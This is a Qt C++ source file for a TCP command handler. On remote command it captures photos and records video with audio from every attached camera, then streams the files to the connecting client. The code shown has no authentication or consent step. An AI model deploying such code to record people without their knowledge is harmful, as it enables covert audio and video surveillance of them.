#include <QDir>
#include <QFile>
#include <QDebug>

#include "mediacontroller.h"

MediaController::MediaController(MediaServer* server, MediaService* service, QObject* parent)
    : QObject(parent), server(server), service(service) {
    connect(server, &MediaServer::commandReceived, this, &MediaController::handleCommand);
}

void MediaController::handleCommand(const QString& command, QTcpSocket* clientSocket) {
    qDebug() << "Received command:" << command;

    QStringList parts = command.split(' ');
    QString cmd = parts.first();
    QStringList args = parts.mid(1);

    if (cmd == "get_info_from_all") {
        QString info = service->getAllCamerasInfo();
        sendTextResponse(clientSocket, info);
    } else if (cmd == "get_photo_from_all") {
        auto photos = service->capturePhotoFromAllCameras();
        for (const auto& photo : photos) {
            sendFileResponse(clientSocket, photo.first, photo.second);
        }
    } else if (cmd == "get_video_from_all") {
        QString basePath = args.isEmpty() ? QDir::currentPath() : args.first();
        auto videos = service->recordVideoWithAudioFromAllCameras(basePath, 5, 30);
        for (const auto& videoPath : videos) {
            sendFileResponse(clientSocket, QFileInfo(videoPath).fileName(), videoPath);
        }
    } else if (cmd == "get_svideo_from_all") {
        QString basePath = args.isEmpty() ? QDir::currentPath() : args.first();
        auto videos = service->recordVideoFromAllCameras(basePath, 5, 30);
        for (const auto& videoPath : videos) {
            sendFileResponse(clientSocket, QFileInfo(videoPath).fileName(), videoPath);
        }
    } else {
        sendTextResponse(clientSocket, "Unknown command.");
    }
}

void MediaController::sendTextResponse(QTcpSocket* clientSocket, const QString& response) {
    clientSocket->write(response.toUtf8());
    clientSocket->flush();
}

void MediaController::sendFileResponse(QTcpSocket* clientSocket, const QString& fileName, const QByteArray& fileData) {
    QString header = QString("FILE:%1:%2\n").arg(fileName).arg(fileData.size());
    clientSocket->write(header.toUtf8());
    clientSocket->write(fileData);
    clientSocket->flush();
}

void MediaController::sendFileResponse(QTcpSocket* clientSocket, const QString& fileName, const QString& filePath) {
    QFile file(filePath);
    if (!file.open(QIODevice::ReadOnly)) {
        sendTextResponse(clientSocket, "ERROR: Unable to open file: " + filePath);
        return;
    }
    QByteArray fileData = file.readAll();
    file.close();
    QString header = QString("FILE:%1:%2\n").arg(fileName).arg(fileData.size());
    clientSocket->write(header.toUtf8());
    clientSocket->flush();
    qint64 bytesSent = 0;
    while (bytesSent < fileData.size()) {
        qint64 chunkSize = clientSocket->write(fileData.mid(bytesSent));
        if (chunkSize == -1) {
            qWarning() << "Error writing file data to socket";
            break;
        }
        bytesSent += chunkSize;
        clientSocket->flush();
    }
    qDebug() << "File sent successfully: " << fileName;
}
